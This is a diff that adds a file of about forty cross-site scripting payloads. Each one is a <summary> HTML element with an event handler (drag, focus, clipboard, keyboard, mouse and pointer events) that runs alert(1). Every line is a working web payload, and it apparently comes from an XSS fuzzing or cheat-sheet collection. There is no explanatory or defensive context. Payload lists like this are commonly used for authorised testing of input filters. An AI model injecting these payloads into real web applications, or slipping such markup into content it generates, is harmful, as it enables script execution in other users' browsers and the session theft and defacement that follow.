@@ -1,0 +1,43 @@
+<summary draggable="true" ondrag="alert(1)">test</summary>
+<summary draggable="true" ondragend="alert(1)">test</summary>
+<summary draggable="true" ondragenter="alert(1)">test</summary>
+<summary draggable="true" ondragleave="alert(1)">test</summary>
+<summary draggable="true" ondragstart="alert(1)">test</summary>
+<summary id=x tabindex=1 onactivate=alert(1)></summary>
+<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>
+<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>
+<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
+<summary id=x tabindex=1 onfocus=alert(1)></summary>
+<summary id=x tabindex=1 onfocusin=alert(1)></summary>
+<summary onafterscriptexecute=alert(1)><script>1</script>
+<summary onbeforecopy="alert(1)" contenteditable>test</summary>
+<summary onbeforecut="alert(1)" contenteditable>test</summary>
+<summary onbeforepaste="alert(1)" contenteditable>test</summary>
+<summary onbeforescriptexecute=alert(1)><script>1</script>
+<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onclick="alert(1)">test</summary>
+<summary oncontextmenu="alert(1)">test</summary>
+<summary oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<summary oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<summary ondblclick="alert(1)" autofocus tabindex=1>test</summary>
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>
+<summary onkeydown="alert(1)" contenteditable>test</summary>
+<summary onkeypress="alert(1)" contenteditable>test</summary>
+<summary onkeyup="alert(1)" contenteditable>test</summary>
+<summary onmousedown="alert(1)">test</summary>
+<summary onmouseenter="alert(1)">test</summary>
+<summary onmouseleave="alert(1)">test</summary>
+<summary onmousemove="alert(1)">test</summary>
+<summary onmouseout="alert(1)">test</summary>
+<summary onmouseover="alert(1)">test</summary>
+<summary onmouseup="alert(1)">test</summary>
+<summary onmousewheel=alert(1)>requires scrolling
+<summary onpaste="alert(1)" contenteditable>test</summary>
+<summary onpointerdown=alert(1)>XSS</summary>
+<summary onpointerenter=alert(1)>XSS</summary>
+<summary onpointerleave=alert(1)>XSS</summary>
+<summary onpointermove=alert(1)>XSS</summary>
+<summary onpointerout=alert(1)>XSS</summary>
+<summary onpointerover=alert(1)>XSS</summary>
+<summary onpointerrawupdate=alert(1)>XSS</summary>
+<summary onpointerup=alert(1)>XSS</summary>
